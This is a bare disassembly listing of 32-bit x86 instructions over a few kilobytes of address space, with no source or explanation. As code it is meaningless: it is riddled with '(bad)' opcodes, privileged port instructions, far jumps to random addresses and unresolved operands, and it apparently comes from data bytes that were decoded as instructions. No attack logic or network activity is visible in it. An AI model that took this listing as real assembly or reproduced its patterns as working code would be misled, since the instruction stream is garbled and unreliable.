  5361a8:	sub    DWORD PTR [ebx+0x37822445],ecx
  5361ae:	pop    ecx
  5361af:	int    0x5f
  5361b1:	cld    
  5361b2:	jecxz  0x5361b0
  5361b4:	mov    bh,0xd7
  5361b6:	rcl    DWORD PTR [ecx],cl
  5361b8:	out    dx,al
  5361b9:	test   DWORD PTR [esi],0xa7ef1984
  5361bf:	xchg   esi,eax
  5361c0:	mov    BYTE PTR [edx],cl
  5361c2:	shr    DWORD PTR [ebx+0x6a946359],1
  5361c8:	sbb    dl,ah
  5361ca:	jle    0x53616e
  5361cc:	enter  0x3496,0xff
  5361d0:	mov    al,0x70
  5361d2:	cmp    esi,edx
  5361d4:	push   ecx
  5361d5:	jl     0x5361b9
  5361d7:	imul   ecx,DWORD PTR [eax+edx*1-0x32],0xaf4d2bb3
  5361df:	in     eax,dx
  5361e0:	inc    ecx
  5361e1:	sub    cl,BYTE PTR [eax-0x3b]
  5361e4:	push   edi
  5361e5:	xor    DWORD PTR [edi+0x54],edx
  5361e8:	pop    ebp
  5361e9:	ja     0x53624c
  5361eb:	jl     0x5361dd
  5361ed:	add    eax,0xb474437e
  5361f2:	xchg   edx,eax
  5361f3:	mov    ch,BYTE PTR [ecx+edi*8+0x2d84efd]
  5361fa:	fsubr  QWORD PTR [ebx-0x1a]
  5361fd:	push   edx
  5361fe:	call   0x642ae844
  536203:	ins    BYTE PTR es:[edi],dx
  536204:	sbb    DWORD PTR [edi-0x4],esp
  536207:	sahf   
  536208:	fcmovu st,st(7)
  53620a:	retf   
  53620b:	arpl   WORD PTR [edx],bp
  53620d:	sbb    ch,BYTE PTR [ebp-0x322c6628]
  536213:	mov    edx,0xcb145b6c
  536218:	fidivr WORD PTR [eax-0x5ecb11f0]
  53621e:	jmp    0xc37affac
  536223:	in     al,0x9c
  536225:	aad    0xdb
  536227:	mov    al,ds:0x16854e6a
  53622c:	retf   0x9d11
  53622f:	les    ebp,FWORD PTR [esi]
  536231:	lock (bad) 
  536233:	lods   al,BYTE PTR ds:[esi]
  536234:	add    esp,edi
  536236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  536237:	push   cs
  536238:	and    dh,ah
  53623a:	aad    0xda
  53623c:	sub    ch,BYTE PTR [ecx-0x40]
  53623f:	fistp  WORD PTR [ebp-0x6435fd8e]
  536245:	cdq    
  536246:	sbb    BYTE PTR [esi+0x67499e2a],dl
  53624c:	lods   eax,DWORD PTR ds:[esi]
  53624d:	shl    ecx,0x10
  536250:	push   eax
  536251:	lods   eax,DWORD PTR ds:[esi]
  536252:	cdq    
  536253:	jmp    0x8000e3bf
  536258:	jnp    0x5361f8
  53625a:	test   eax,0xb21d0ff7
  53625f:	cmp    eax,0x8d09a561
  536264:	addr16 mov al,fs:0x8d17
  536269:	dec    ecx
  53626a:	dec    ecx
  53626b:	or     eax,0x843b17c9
  536270:	or     DWORD PTR fs:[eax],0x6cdb50b2
  536277:	out    0xe2,al
  536279:	ss pop es
  53627b:	xchg   BYTE PTR [esi],al
  53627d:	mov    ds:0x61bf43d8,al
  536282:	sbb    BYTE PTR [ecx],cl
  536284:	test   eax,0x35f1e584
  536289:	sbb    al,0x42
  53628b:	dec    eax
  53628c:	mov    al,0xa9
  53628e:	mov    cl,0xf4
  536290:	nop
  536291:	daa    
  536292:	in     eax,0x88
  536294:	stc    
  536295:	dec    ebx
  536296:	push   ebp
  536297:	in     al,0xec
  536299:	or     ebx,ecx
  53629b:	js     0x53627c
  53629d:	aas    
  53629e:	jle    0x536307
  5362a0:	ret    
  5362a1:	lods   al,BYTE PTR ds:[esi]
  5362a2:	cmp    BYTE PTR [edx+edi*8+0x59],ah
  5362a6:	test   DWORD PTR [ebx],ebx
  5362a8:	rcl    DWORD PTR [ecx-0x6bb12be],cl
  5362ae:	sub    al,0x1a
  5362b0:	fstp   st(1)
  5362b2:	outs   dx,DWORD PTR ds:[esi]
  5362b3:	ret    0x974e
  5362b6:	lods   al,BYTE PTR ds:[esi]
  5362b7:	cdq    
  5362b8:	dec    ebp
  5362b9:	scas   eax,DWORD PTR es:[edi]
  5362ba:	mov    esp,0x49a0a007
  5362bf:	xchg   esp,eax
  5362c0:	out    0x19,eax
  5362c2:	add    eax,0x220f6796
  5362c7:	and    al,0x44
  5362c9:	sub    eax,0x3f6be12d
  5362ce:	inc    ebp
  5362cf:	jb     0x5362ef
  5362d1:	xchg   BYTE PTR [ecx-0x2b],ch
  5362d4:	dec    edx
  5362d5:	or     eax,0x71c500e8
  5362da:	inc    ebp
  5362db:	popf   
  5362dc:	pop    ss
  5362dd:	jmp    0xbb61fc06
  5362e2:	test   BYTE PTR [ebp-0x57],ch
  5362e5:	mov    cl,0x53
  5362e7:	cwde   
  5362e8:	repz xor di,dx
  5362ec:	and    eax,0x95950f77
  5362f1:	xor    al,0x7c
  5362f3:	test   DWORD PTR es:[esi+ebx*8],esi
  5362f7:	mov    ds:0x652fad53,eax
  5362fc:	int3   
  5362fd:	mov    edx,DWORD PTR [ebp-0x3f2d4a0c]
  536303:	push   esp
  536305:	dec    esp
  536306:	rol    BYTE PTR [eax],0x49
  536309:	xor    esp,DWORD PTR [ebp+0x4eed0e0b]
  53630f:	es dec eax
  536311:	in     eax,dx
  536312:	add    dl,dh
  536314:	fucomip st,st(0)
  536316:	jp     0x536308
  536318:	inc    edx
  536319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  53631a:	mov    edx,0x52667e25
  53631f:	ja     0x5362f7
  536321:	aad    0x42
  536323:	sub    dl,BYTE PTR [edi-0x2a]
  536326:	mov    bl,0x1
  536328:	cmp    BYTE PTR [ebx+0x68aa863c],bl
  53632e:	pop    ebx
  53632f:	xlat   BYTE PTR ds:[ebx]
  536330:	gs jle 0x5362ef
  536333:	or     ebp,ecx
  536335:	movq   mm2,QWORD PTR [ecx+0x7b0eb54d]
  53633c:	mov    ds:0xd5f8b25f,al
  536341:	add    DWORD PTR [ebp-0x29b2fdc1],edx
  536347:	adc    esp,DWORD PTR [ebx+ebx*8-0xa430808]
  53634e:	adc    ah,ah
  536350:	jb     0x536317
  536352:	test   eax,0x77dbcd8a
  536357:	inc    ah
  536359:	jmp    0x536371
  53635b:	clc    
  53635c:	test   BYTE PTR [ecx],dh
  53635e:	jg     0x5362ed
  536360:	pop    edx
  536361:	or     DWORD PTR [ebx-0x3d4746dd],0xffffffa6
  536368:	sub    eax,0x9fb0be9d
  53636d:	xchg   BYTE PTR [edx+0x4ca16a2b],dl
  536373:	fidiv  WORD PTR [eax+0x58]
  536376:	lea    ebp,[ecx-0x5aba6da3]
  53637c:	push   0xda506ac6
  536381:	in     eax,dx
  536382:	add    edi,eax
  536384:	xor    al,0x52
  536386:	imul   edx,DWORD PTR [edx+0x22eb3c18],0xffffffea
  53638d:	sub    DWORD PTR [edi+0x4a],edx
  536390:	repnz lods eax,DWORD PTR ds:[esi]
  536392:	xor    cl,BYTE PTR [edi-0x11e84392]
  536398:	inc    ebp
  536399:	inc    ecx
  53639a:	inc    esi
  53639b:	cmp    DWORD PTR [edx],0x57e8b6f8
  5363a1:	xchg   edi,eax
  5363a2:	retf   
  5363a3:	aad    0x31
  5363a5:	out    0x8,al
  5363a7:	xchg   BYTE PTR [esi],cl
  5363a9:	or     DWORD PTR [esi],esi
  5363ab:	outs   dx,DWORD PTR ds:[esi]
  5363ac:	outs   dx,DWORD PTR ds:[esi]
  5363ad:	leave  
  5363ae:	pop    ebx
  5363af:	data16 jmp 0x5363a2
  5363b2:	push   DWORD PTR [ecx]
  5363b4:	sbb    esi,0x8b89da37
  5363ba:	into   
  5363bb:	bound  ebx,QWORD PTR [esi]
  5363bd:	xor    cl,BYTE PTR [ecx]
  5363bf:	call   0x4058:0x35968c46
  5363c6:	js     0x5363b1
  5363c8:	mov    ds:0x1bcedbc4,eax
  5363cd:	cmp    BYTE PTR [edi+0x1e7da42b],ah
  5363d3:	shl    BYTE PTR [ebp-0x1fba7c36],cl
  5363d9:	fcomp  QWORD PTR [ecx+0x756cdf4b]
  5363df:	inc    ecx
  5363e0:	dec    edx
  5363e1:	mov    DWORD PTR [edi],esi
  5363e3:	fwait
  5363e4:	test   BYTE PTR [edi+ebp*2],dh
  5363e7:	repnz or ebp,DWORD PTR ds:0x319ae39b
  5363ee:	mov    esp,0xb7f1673e
  5363f3:	inc    esp
  5363f4:	sub    ebp,DWORD PTR es:[ebp+0x4788879c]
  5363fb:	je     0x53644f
  5363fd:	xor    edi,eax
  5363ff:	pop    ecx
  536400:	idiv   BYTE PTR [eax+0x17]
  536403:	jg     0x5363ab
  536405:	das    
  536406:	test   DWORD PTR [ecx],0xa9d944cc
  53640c:	jmp    0xfbb9:0x7e28da29
  536413:	retf   0xfed1
  536416:	inc    BYTE PTR [ebp-0x1f09641c]
  53641c:	repz aaa 
  53641e:	or     ch,bl
  536420:	lock or eax,0x1e707bbb
  536426:	imul   edx,DWORD PTR [eax-0x20],0xffffff85
  53642a:	adc    eax,0xaef6b2ce
  53642f:	push   ebx
  536430:	xor    BYTE PTR [esi],bh
  536432:	sahf   
  536433:	aas    
  536434:	xchg   BYTE PTR [eax+0x17],al
  536437:	mov    ecx,0xc3f0a836
  53643c:	in     eax,dx
  53643d:	ins    BYTE PTR es:[edi],dx
  53643e:	pop    ebp
  53643f:	xor    eax,0xfaf766a6
  536444:	sbb    bh,BYTE PTR [ecx]
  536446:	and    al,BYTE PTR [esi+0x23]
  536449:	mov    bh,0x18
  53644b:	jecxz  0x5363f1
  53644d:	dec    esi
  53644e:	push   ds
  53644f:	xor    esi,DWORD PTR [ebx]
  536451:	mov    ah,0xf1
  536453:	sahf   
  536454:	pop    esp
  536455:	push   cs
  536456:	adc    BYTE PTR [esi],ah
  536458:	lods   eax,DWORD PTR ds:[esi]
  536459:	push   ecx
  53645a:	pop    ss
  53645b:	sar    BYTE PTR [esi+0x7b4bc391],1
  536461:	push   ss
  536462:	xor    ebx,esp
  536464:	cdq    
  536465:	jg     0x536446
  536467:	dec    esi
  536468:	outs   dx,DWORD PTR ds:[esi]
  536469:	xchg   ebx,eax
  53646a:	ud2    
  53646c:	push   esp
  53646d:	mov    ch,0x38
  53646f:	jge    0x53647b
  536471:	int3   
  536472:	xchg   DWORD PTR [ecx-0x6e],esi
  536475:	in     al,0x8d
  536477:	inc    ebx
  536478:	ja     0x536449
  53647a:	ss cmc 
  53647c:	add    al,0x95
  53647e:	jmp    0x53644c
  536480:	inc    ebx
  536481:	fisttp QWORD PTR [edi]
  536483:	stc    
  536484:	scas   eax,DWORD PTR es:[edi]
  536485:	jmp    DWORD PTR [edx+ebx*1+0x3acc21aa]
  53648c:	pop    ecx
  53648d:	dec    esp
  53648e:	jbe    0x5364c3
  536490:	xchg   ebp,eax
  536491:	xlat   BYTE PTR ds:[ebx]
  536492:	enter  0xa423,0x6e
  536496:	jo     0x536423
  536498:	xchg   ebx,eax
  536499:	fs inc esi
  53649b:	mov    ds:0x329c0f5e,al
  5364a0:	push   ds
  5364a1:	clc    
  5364a2:	mov    ebx,0x8761cbfd
  5364a7:	mov    edx,0xc620ca80
  5364ac:	add    al,0xc2
  5364ae:	cmp    esp,esp
  5364b0:	shl    dl,cl
  5364b2:	cld    
  5364b3:	retf   
  5364b4:	xchg   ecx,eax
  5364b5:	dec    edx
  5364b6:	jb     0x5364b3
  5364b8:	outs   dx,DWORD PTR ds:[esi]
  5364b9:	data16 stc 
  5364bb:	lahf   
  5364bc:	sbb    BYTE PTR ds:[esi],al
  5364bf:	and    ecx,0x11f3f006
  5364c5:	hlt    
  5364c6:	(bad)  
  5364c7:	outs   dx,DWORD PTR ds:[esi]
  5364c8:	std    
  5364c9:	(bad)  
  5364ca:	adc    bh,cl
  5364cc:	push   ebx
  5364cd:	(bad)  
  5364ce:	pop    ebx
  5364cf:	fcom   DWORD PTR [edi-0x387e5aa3]
  5364d5:	cmp    eax,0x21d55b38
  5364da:	fadd   QWORD PTR [ecx-0x1f]
  5364dd:	xchg   esp,eax
  5364de:	std    
  5364df:	rol    DWORD PTR [eax+0x2bfe8c21],cl
  5364e5:	jne    0x536517
  5364e7:	mov    ds:0x887dfe93,al
  5364ec:	xor    BYTE PTR [esi-0x42],ch
  5364ef:	les    esi,FWORD PTR [eax+0x72]
  5364f2:	stc    
  5364f3:	adc    al,0xf2
  5364f5:	lods   al,BYTE PTR ds:[esi]
  5364f6:	or     dl,BYTE PTR [ecx+edi*2-0x4c9e1929]
  5364fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5364fe:	hlt    
  5364ff:	scas   al,BYTE PTR es:[edi]
  536500:	and    al,0x71
  536502:	push   esi
  536503:	test   eax,0xc2466718
  536508:	imul   esi,eax,0x9900d0
  53650e:	dec    ebx
  53650f:	push   ss
  536510:	cmp    BYTE PTR [ebx+0x38],ch
  536513:	jmp    0x53649b
  536515:	jg     0x536578
  536517:	inc    eax
  536518:	inc    BYTE PTR [edi+eiz*8-0x26]
  53651c:	mov    ebp,0xea3057d2
  536521:	iret   
  536522:	mov    edx,0x9dafbec0
  536527:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  536528:	test   eax,0x8c6aa8c2
  53652d:	loopne 0x5365aa
  53652f:	push   0x80546ea0
  536534:	dec    ebx
  536535:	push   ecx
  536536:	stos   DWORD PTR es:[edi],eax
  536537:	outs   dx,DWORD PTR ds:[esi]
  536538:	ret    0x37f5
  53653b:	sub    bl,dh
  53653d:	cmp    ebp,DWORD PTR [ebx]
  53653f:	test   BYTE PTR [edx+0x15],0x22
  536543:	lods   eax,DWORD PTR ds:[esi]
  536544:	add    BYTE PTR [ecx],ah
  536546:	or     ah,ah
  536548:	mov    cl,0xe9
  53654a:	vpaddb ymm5,ymm5,ymm0
  53654e:	enter  0x2a71,0xc5
  536552:	and    DWORD PTR [edi-0x56],eax
  536555:	mov    ecx,0xb9ac0b6a
  53655a:	sub    BYTE PTR [esi-0xf],dh
  53655d:	or     al,cl
  53655f:	loop   0x53659c
  536561:	jnp    0x536566
  536563:	jne    0x53655b
  536565:	into   
  536566:	mov    es,esi
  536568:	jmp    0x303c181f
  53656d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  53656e:	adc    DWORD PTR [edi],edx
  536570:	fwait
  536571:	fwait
  536572:	int3   
  536573:	pop    ds
  536574:	aaa    
  536575:	popa   
  536576:	pop    ebx
  536577:	arpl   WORD PTR [ebx-0x6dd96a96],cx
  53657d:	ja     0x5365af
  53657f:	push   ebx
  536580:	and    DWORD PTR [ecx],eax
  536582:	lahf   
  536583:	aaa    
  536584:	loop   0x5365fe
  536586:	add    al,0xeb
  536588:	fcmovne st,st(3)
  53658a:	rcl    edx,0x90
  53658d:	mov    ah,BYTE PTR [edi+0x1debade1]
  536593:	js     0x5365a2
  536595:	adc    DWORD PTR [esi-0x39eed9a0],edx
  53659b:	idiv   BYTE PTR [esi]
  53659d:	sub    DWORD PTR [ebx+0x59c2e5b],0xf2b7e40a
  5365a7:	push   edi
  5365a8:	icebp  
  5365a9:	mov    ecx,0x87f5372
  5365ae:	dec    esi
  5365af:	xor    ch,BYTE PTR [eax]
  5365b1:	push   0xfffffffa
  5365b3:	stos   DWORD PTR es:[edi],eax
  5365b4:	and    ah,ch
  5365b6:	out    0x35,eax
  5365b8:	(bad)
  5365bc:	sbb    DWORD PTR [eax],ebx
  5365be:	icebp  
  5365bf:	mov    ebx,0x9035ccdf
  5365c4:	inc    esi
  5365c5:	daa    
  5365c6:	cmp    BYTE PTR [edx],bh
  5365c8:	aas    
  5365c9:	cli    
  5365ca:	xor    al,BYTE PTR [ebx-0x45]
  5365cd:	push   0xffffff9b
  5365cf:	push   ebx
  5365d0:	mov    ah,0x52
  5365d2:	sub    BYTE PTR ds:0xba937d3f,0x13
  5365d9:	cmp    al,0x48
  5365db:	mov    ch,0x59
  5365dd:	popa   
  5365de:	xchg   DWORD PTR [edi+0xd],edx
  5365e1:	xchg   ebx,eax
  5365e2:	aas    
  5365e3:	push   0xffffff8f
  5365e5:	aas    
  5365e6:	xchg   ecx,eax
  5365e7:	push   ebp
  5365e8:	scas   al,BYTE PTR es:[edi]
  5365e9:	and    bh,bl
  5365eb:	retf   0x9357
  5365ee:	jbe    0x5365a9
  5365f0:	push   edi
  5365f1:	lods   al,BYTE PTR ds:[esi]
  5365f2:	cmp    DWORD PTR [ebp+0xd],ecx
  5365f5:	sub    esi,DWORD PTR [ebp-0x7a25ee43]
  5365fb:	and    eax,0x827881e
  536600:	dec    eax
  536601:	pop    es
  536602:	or     eax,0x3f0404e4
  536607:	enter  0x3a2,0x46
  53660b:	popf   
  53660c:	xor    esi,edi
  53660e:	ja     0x53665e
  536610:	adc    BYTE PTR [ebp-0x75],ch
  536613:	jnp    0x536686
  536615:	mov    esi,0x31dc5c5c
  53661a:	sbb    DWORD PTR [ebx],ebp
  53661c:	scas   eax,DWORD PTR es:[edi]
  53661d:	loop   0x536687
  53661f:	cdq    
  536620:	ins    BYTE PTR es:[edi],dx
  536621:	cmp    ebp,esi
  536623:	ret    0x4c7
  536626:	pop    eax
  536627:	inc    esi
  536628:	xor    ecx,DWORD PTR [edi+ebx*2]
  53662b:	aas    
  53662c:	push   esi
  53662d:	in     eax,0xe8
  53662f:	sbb    DWORD PTR [ecx-0x3fe35436],ecx
  536635:	mov    eax,ds:0xbb8f82bc
  53663a:	mov    bl,0xdf
  53663c:	cmp    DWORD PTR [edx],ebx
  53663e:	out    dx,al
  53663f:	pop    edi
  536640:	adc    BYTE PTR [esi+0x76],0x30
  536644:	popf   
  536645:	in     al,dx
  536646:	js     0x5366b8
  536648:	es jecxz 0x536642
  53664b:	push   0x3b
  53664d:	je     0x5365cf
  53664f:	jg     0x53663d
  536651:	pushf  
  536652:	add    BYTE PTR [eax-0x21ba197],0x24
  536659:	popa   
  53665a:	jle    0x53662c
  53665c:	add    al,0xb9
  53665e:	pusha  
  53665f:	mov    dl,0x2b
  536661:	call   0xf723:0x83b1efb4
  536668:	jg     0x53669d
  53666a:	je     0x53664f
  53666c:	xchg   ebx,eax
  53666d:	pop    ebp
  53666e:	xor    BYTE PTR [eax-0x5c],bh
  536671:	adc    edx,0xffffff9e
  536674:	scas   eax,DWORD PTR es:[edi]
  536675:	sub    edi,ebx
  536677:	add    BYTE PTR [edx],dl
  536679:	pusha  
  53667a:	test   DWORD PTR [ebx-0x27],ebx
  53667d:	push   0xaf742d90
  536682:	pop    es
  536683:	jl     0x5366d4
  536685:	retfw  
  536687:	lods   eax,DWORD PTR ds:[esi]
  536688:	aam    0x61
  53668a:	pop    ebx
  53668b:	pop    esp
  53668c:	out    dx,eax
  53668d:	xchg   ebp,eax
  53668e:	and    al,0x97
  536690:	outs   dx,DWORD PTR ds:[esi]
  536691:	inc    ecx
  536692:	xchg   ebp,eax
  536693:	and    DWORD PTR [ecx],eax
  536695:	sbb    al,0xac
  536697:	jmp    0x5366f4
  536699:	push   0x5c
  53669b:	out    0x3,eax
  53669d:	mov    ?,ebp
  53669f:	dec    ecx
  5366a0:	cmp    al,0x6a
  5366a2:	retf   
  5366a3:	dec    esi
  5366a4:	xor    al,0x58
  5366a6:	cmp    DWORD PTR [edi+ebx*1+0x1],esi
  5366aa:	xchg   esp,eax
  5366ab:	push   ebp
  5366ac:	mov    BYTE PTR [eax],dh
  5366ae:	enter  0x930e,0x2d
  5366b2:	sbb    eax,0x1db45c1a
  5366b7:	add    DWORD PTR [eax+ecx*2+0x46],ecx
  5366bb:	lds    edi,FWORD PTR [ecx-0x78]
  5366be:	push   ss
  5366bf:	lods   eax,DWORD PTR ds:[esi]
  5366c0:	sub    DWORD PTR [eax+ebp*1-0x60],0x6318a97c
  5366c8:	add    BYTE PTR [edi],dh
  5366ca:	inc    edx
  5366cb:	sub    al,0x96
  5366cd:	retf   0xca40
  5366d0:	sar    BYTE PTR [esi],1
  5366d2:	jl     0x536746
  5366d4:	mov    eax,0xdb5ef5f8
  5366d9:	push   esi
  5366da:	cmp    BYTE PTR [ecx-0x3d],cl
  5366dd:	pop    eax
  5366de:	aad    0x99
  5366e0:	inc    ebx
  5366e1:	scas   al,BYTE PTR es:[edi]
  5366e2:	test   DWORD PTR [esi+0x5ab1d87b],edx
  5366e8:	sahf   
  5366e9:	pop    ebx
  5366ea:	test   eax,0x1c0f8a9
  5366ef:	add    DWORD PTR [edi+0x2c383e4d],0x35
  5366f6:	or     BYTE PTR [ecx+edx*2+0x36],dh
  5366fa:	sub    eax,0x6f53393f
  5366ff:	out    dx,eax
  536700:	mov    BYTE PTR [edi-0x264658e0],0x45
  536707:	pushf  
  536708:	and    dl,dl
  53670a:	sub    ah,ah
  53670c:	pop    esi
  53670d:	fndisi(8087 only) 
  53670f:	pop    eax
  536710:	cmp    DWORD PTR [ecx],esi
  536712:	pop    esi
  536713:	inc    esi
  536714:	cld    
  536715:	push   esp
  536716:	inc    ebp
  536717:	xor    al,0x82
  536719:	xchg   edi,eax
  53671a:	fldenv [edx+0xe]
  53671d:	arpl   WORD PTR [esp+eiz*8],ax
  536720:	sbb    al,BYTE PTR [edi-0x2e]
  536723:	sbb    bh,bh
  536725:	jno    0x5366b3
  536727:	adc    al,0x3a
  536729:	aas    
  53672a:	pop    ebx
  53672b:	popf   
  53672c:	cmc    
  53672d:	and    BYTE PTR [ebp+ecx*8+0x40a8b626],ch
  536734:	add    DWORD PTR [edi-0x7181d275],0x6b
  53673b:	(bad)  
  53673d:	cmp    ebx,eax
  53673f:	and    ebx,DWORD PTR [edx+0x1e]
  536742:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  536744:	cld    
  536745:	in     al,0xa0
  536747:	sbb    DWORD PTR [edi-0x24],edx
  53674a:	add    bh,dl
  53674c:	or     DWORD PTR [edx],ebx
  53674e:	adc    al,0xef
  536750:	or     bl,ah
  536752:	cmp    DWORD PTR [edi-0x10956498],esp
  536758:	mov    ah,0x2b
  53675a:	sub    eax,0x3af37f11
  53675f:	lods   eax,DWORD PTR ds:[esi]
  536760:	repnz or al,0x6b
  536763:	sub    bh,al
  536765:	outs   dx,DWORD PTR ds:[esi]
  536766:	sub    ah,BYTE PTR [eax]
  536768:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  53676a:	lods   al,BYTE PTR ds:[esi]
  53676b:	or     esi,DWORD PTR [esi-0x555775]
  536771:	xor    BYTE PTR [edi+0x27809c],bl
  536777:	into   
  536778:	jp     0x53675d
  53677a:	add    dl,al
  53677c:	dec    ecx
  53677d:	and    BYTE PTR [ecx-0x3e],0xb8
  536781:	cmc    
  536782:	sub    BYTE PTR [edi+0x6f],0xcc
  536786:	icebp  
  536787:	aas    
  536788:	dec    edi
  536789:	jmp    0x544a:0x2dd03584
  536790:	sbb    cl,BYTE PTR [eax+0xa]
  536793:	out    dx,eax
  536794:	xchg   esp,eax
  536795:	xlat   BYTE PTR ds:[ebx]
  536796:	ficomp WORD PTR [esi+0x187e4f7d]
  53679c:	fidivr WORD PTR ds:0x34e29329
  5367a2:	mov    WORD PTR [edi-0x77],?
  5367a5:	sbb    al,0xb2
  5367a7:	lea    esp,[ecx+edx*8+0x3d]
  5367ab:	cld    
  5367ac:	pop    esi
  5367ad:	in     al,0x8d
  5367af:	ss sbb al,0x87
  5367b2:	mov    ecx,0x73d93878
  5367b7:	and    BYTE PTR [esi],cl
  5367b9:	pop    ebp
  5367ba:	jmp    0xd482:0xd2ca50b2
  5367c1:	fisttp WORD PTR [edi+0x56894725]
  5367c7:	or     BYTE PTR [ebx-0x38cb2aeb],0x51
  5367ce:	add    al,0xaf
  5367d0:	(bad)  
  5367d2:	rol    BYTE PTR [edx],0x1c
  5367d5:	mov    ds:0x48cd4f1a,eax
  5367da:	mov    WORD PTR [esi+eax*2],fs
  5367dd:	pushf  
  5367de:	dec    ecx
  5367df:	fimul  WORD PTR [ecx+0x39]
  5367e2:	push   ecx
  5367e3:	aas    
  5367e4:	lea    edi,[ebx-0x21]
  5367e7:	aad    0x32
  5367e9:	arpl   WORD PTR [edx+0x44e72500],di
  5367ef:	pop    edi
  5367f0:	push   ebx
  5367f1:	fadd   DWORD PTR [eax+0xc]
  5367f4:	out    dx,eax
  5367f5:	xchg   esi,eax
  5367f6:	mov    al,ds:0xe0e8b62c
  5367fb:	inc    edx
  5367fc:	bound  esi,QWORD PTR [ebp+0x47b39c61]
  536802:	jne    0x5367aa
  536804:	or     eax,0xc6da462b
  536809:	push   esi
  53680a:	jno    0x536809
  53680c:	push   esi
  53680d:	or     BYTE PTR [ebp+edx*4+0x51],bl
  536811:	push   ss
  536812:	aam    0xa4
  536814:	sbb    eax,0x6342c014
  536819:	xor    al,0x22
  53681b:	xchg   esi,eax
  53681c:	div    BYTE PTR [esi+0x6b2e41f6]
  536822:	enter  0x1517,0xaf
  536826:	jle    0x536876
  536828:	mov    WORD PTR [ebx+0x71],?
  53682b:	lea    edx,[ebx]
  53682d:	dec    ebp
  53682e:	stos   DWORD PTR es:[edi],eax
  53682f:	or     esi,DWORD PTR [edx]
  536831:	mov    BYTE PTR [esi],bl
  536833:	(bad)  
  536834:	in     eax,0xdd
  536836:	mov    cl,BYTE PTR [edx]
  536838:	mov    ah,0xeb
  53683a:	out    dx,eax
  53683b:	mov    esp,0x51cac5a6
  536840:	and    BYTE PTR [ecx+0x6a],bl
  536843:	in     eax,dx
  536844:	test   eax,eax
  536846:	xchg   DWORD PTR [esi+0x30faa20a],edi
  53684c:	push   edi
  53684d:	cli    
  53684e:	sbb    ch,bh
  536850:	in     ax,0x44
  536853:	dec    eax
  536854:	call   0x7ad2:0x6421090
  53685b:	icebp  
  53685c:	in     eax,dx
  53685d:	cmp    DWORD PTR [esi+ecx*1],0x6c
  536861:	inc    eax
  536862:	inc    ebx
  536863:	rol    BYTE PTR [eax+0x5d],0xaf
  536867:	loope  0x536897
  536869:	and    ch,0xa1
  53686c:	mov    WORD PTR gs:[ecx+0x6d31ac8e],es
  536873:	xchg   ecx,eax
  536874:	(bad)  
  536875:	std    
  536876:	xor    edi,DWORD PTR [edi+0x40119074]
  53687c:	ss out 0x2c,al
  53687f:	sbb    dh,BYTE PTR [ebp-0x4f0a3cb]
  536885:	aas    
  536886:	jnp    0x536864
  536888:	inc    eax
  536889:	div    DWORD PTR [eax+eax*4+0xf]
  53688d:	push   es
  53688e:	ja     0x536836
  536890:	shr    ah,1
  536892:	add    dl,dh
  536894:	inc    ecx
  536895:	jnp    0x5368bb
  536897:	and    BYTE PTR [edx-0x280b7071],0xcd
  53689e:	sub    edi,DWORD PTR [ebp-0x42]
  5368a1:	ins    BYTE PTR es:[edi],dx
  5368a2:	lods   al,BYTE PTR ds:[si]
  5368a4:	push   es
  5368a5:	fisubr WORD PTR [eax]
  5368a7:	cs push edx
  5368a9:	cli    
  5368aa:	outs   dx,DWORD PTR ds:[esi]
  5368ab:	fwait
  5368ac:	mov    ah,0x63
  5368ae:	outs   dx,DWORD PTR ds:[esi]
  5368af:	iret   
  5368b0:	sti    
  5368b1:	fs dec esi
  5368b3:	ret    
  5368b4:	adc    BYTE PTR [ebx],ch
  5368b6:	pop    edi
  5368b7:	xor    BYTE PTR [eax+0x28],bl
  5368ba:	mov    ch,0xff
  5368bc:	ret    
  5368bd:	and    DWORD PTR [ecx-0x28877051],eax
  5368c3:	mov    edx,0x5bdb1690
  5368c8:	and    ecx,esi
  5368ca:	cmp    DWORD PTR [edx+0xc],ebp
  5368cd:	nop
  5368ce:	and    cl,BYTE PTR [edi-0x62e1a08d]
  5368d4:	stos   BYTE PTR es:[edi],al
  5368d5:	jb     0x5368fd
  5368d7:	add    eax,0xe8b37334
  5368dc:	sub    al,0xf8
  5368de:	sub    BYTE PTR [esi+0x2973bc18],0x2f
  5368e5:	sub    BYTE PTR [esi-0x5e],0x26
  5368e9:	or     eax,0xad4f9a2a
  5368ee:	stos   BYTE PTR es:[edi],al
  5368ef:	imul   eax,DWORD PTR [ebx+ecx*4],0xd
  5368f3:	in     eax,0x3a
  5368f5:	jae    0x5368ad
  5368f7:	les    edx,FWORD PTR [esi+edx*1+0x5ede070b]
  5368fe:	dec    ebx
  5368ff:	mov    dl,0xb0
  536901:	or     al,0x15
  536903:	inc    ecx
  536904:	test   dl,bh
  536906:	adc    edx,DWORD PTR [ebx+0x26e897d7]
  53690c:	popf   
  53690d:	fdecstp 
  53690f:	scas   al,BYTE PTR es:[edi]
  536910:	jp     0x5368c8
  536912:	or     DWORD PTR [edi+0x6],eax
  536915:	popf   
  536916:	mov    ebx,0x39eba8c7
  53691b:	inc    eax
  53691c:	xor    eax,0xba45cc5b
  536921:	add    eax,DWORD PTR [edx]
  536923:	jle    0x536959
  536925:	push   edi
  536926:	cs aam 0xe1
  536929:	lock pop edi
  53692b:	add    al,0xdc
  53692d:	xor    dl,BYTE PTR [edi]
  53692f:	test   al,cl
  536931:	call   0xa2d913c0
  536936:	loopne 0x53691d
  536938:	inc    ebx
  536939:	mul    BYTE PTR [ebx+0x586ac2ce]
  53693f:	push   cs
  536940:	jo     0x536939
  536942:	out    dx,eax
  536943:	adc    DWORD PTR [eax+0x79e3e8cb],ebp
  536949:	shl    edi,0x39
  53694c:	mov    esp,0x4cd7afee
  536951:	es inc ebx
  536953:	aad    0x63
  536955:	aas    
  536956:	ret    
  536957:	cwde   
  536958:	lods   al,BYTE PTR ds:[esi]
  536959:	(bad)  
  53695a:	mov    BYTE PTR [edx],0xa9
  53695d:	xor    al,0x37
  53695f:	xor    ebx,DWORD PTR [ebp+0x1a78b36c]
  536965:	sub    edx,DWORD PTR ds:0x3dd4fc17
  53696b:	in     al,0x64
  53696d:	jns    0x5369d9
  53696f:	daa    
  536970:	into   
  536971:	inc    esp
  536972:	ja     0x53697b
